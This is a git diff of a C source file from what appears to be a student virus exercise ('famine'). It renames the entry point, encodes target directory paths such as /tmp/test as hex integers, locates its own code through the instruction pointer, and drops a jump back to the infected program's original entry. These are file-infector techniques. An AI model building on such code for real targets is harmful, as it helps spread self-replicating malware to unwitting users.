@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/05 15:14:36 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 15:39:43 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,20 +14,20 @@
 
 #define BUFF_SIZE 0x1000
 
-void _start() {
+void famine() {
 	byte		*start_rip;
 	get_rip(start_rip);
 
 	int64_t		ret = 0;
 	int64_t		fd;
 	byte		buff[BUFF_SIZE];
-	//str		directories[] = {"/tmp/test1", "/tmp/test2", NULL};
-	uint64_t	directories[] = {0x7365742f706d742f, 0x003174, 0x7365742f706d742f, 0x003274, 0, 0};
+	//str		directories[] = {"/tmp/test", "/tmp/test2", NULL};
+	uint64_t	directories[] = {0x7365742f706d742f, 0x0074, 0x7365742f706d742f, 0x003274, 0, 0};
 	char		max_path[513];
 	dirent		*d;
 	uint64_t	string = 0x000a303132333435;
 	profiling	this;
-	
+
 	start_rip -= 0x12;
 	this = get_profiling(start_rip);
 	(void)this;
@@ -89,7 +89,5 @@ void _start() {
 			max_path[i] = 0;
 	}
 
-	write(ret, 1, &ret, 1);
-
-	the_point_of_no_return(this.original);
+	write(ret, 1, &string, 8);
 }
